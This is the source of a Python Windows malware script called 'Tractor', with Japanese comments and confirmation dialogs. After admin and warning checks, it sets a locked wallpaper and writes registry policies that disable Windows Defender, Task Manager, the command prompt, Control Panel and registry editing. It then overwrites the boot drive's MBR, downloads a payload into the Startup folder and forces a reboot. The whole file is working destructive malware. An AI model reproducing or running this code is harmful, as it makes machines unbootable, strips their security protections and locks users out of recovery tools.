import requests
import ctypes
import winreg
import os
from win32api import *
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *

def mbr_overwrite():
    mbr_bin = AllocateReadBuffer(512)
    hDevice = CreateFileW(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        0,
        0
    )
    WriteFile(
        hDevice,
        mbr_bin,
        None
    )
    CloseHandle(hDevice)

def download_background():
    background_image = requests.get("https://i-ogp.pximg.net/c/540x540_70/img-master/img/2016/01/13/21/08/28/54699062_p0_square1200.jpg").content
    with open(os.getenv("LOCALAPPDATA") + "\\Temp\\a80dc768-41e9-4288-9f89-a295fe364014.png", "wb") as file:
        file.write(background_image)
        file.close()

def download_virus():
    virus_data = requests.get("").content
    with open(os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\tractor.exe", "wb") as tractor:
        tractor.write(virus_data)
        tractor.close()

def edit_reg_dword(winreg_path, path, value, content):
    key = winreg.OpenKeyEx(winreg_path, path, access=winreg.KEY_WRITE)
    winreg.SetValueEx(key, value, int(content), winreg.REG_DWORD)
    winreg.CloseKey(key)

def edit_reg_sz(winreg_path, path, value, content):
    key = winreg.OpenKeyEx(winreg_path, path, access=winreg.KEY_WRITE)
    winreg.SetValueEx(key, value, str(content), winreg.REG_SZ)
    winreg.CloseKey(key)

def update_reg():
    edit_reg_sz(winreg.HKEY_CURRENT_USER, "Control Panel\\Desktop", "WallPaper", os.getenv("LOCALAPPDATA") + "\\Temp\\a80dc768-41e9-4288-9f89-a295fe364014.png") # 背景画像設定
    edit_reg_dword(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop", "NoChangingWallPaper", 1) # 壁紙変更無効化
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 0)
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 1) # コマンドプロンプト無効化
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1) # タスクマネージャー無効化
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", 1) # 設定とコントロールパネル無効化
    edit_reg_dword(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableRegistryTools", 1) # レジストリ編集無効化

def warn():
    if MessageBox("TractorはMalwareの一つであり、環境によってはPCの復帰が困難になります。\n実行してもよろしいですか?", "Tractorの実行", MB_YESNO | MB_ICONINFORMATION) == 7:
        return False
    if MessageBox("これはMalwareであり、最終的にPCが利用不可能になりかねません。\n本当に実行してもよろしいですか?", "Tractorの実行確認", MB_YESNO | MB_ICONWARNING) == 7:
        return False
    if MessageBox("最終警告です!\n\nこれはウィルスです。\n最悪の場合PCが利用不可能になります。\n本当に実行してもよろしいですか?", "最終警告", MB_YESNO | MB_ICONWARNING) == 7:
        return False
    return True

def main():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        MessageBox("管理者権限がありません。\n実行するには管理者権限が必要です。", "UAC必須", MB_OK | MB_ICONERROR)
        exit()
    if warn() == False:
        exit()
    download_background() # 背景画像のダウンロード
    update_reg() # レジストリ改変
    mbr_overwrite() # MBR上書き
    download_virus() # ウィルス本体をダウンロード
    os.system("shutdown /r /t 0") # 強制再起動

main() # 実行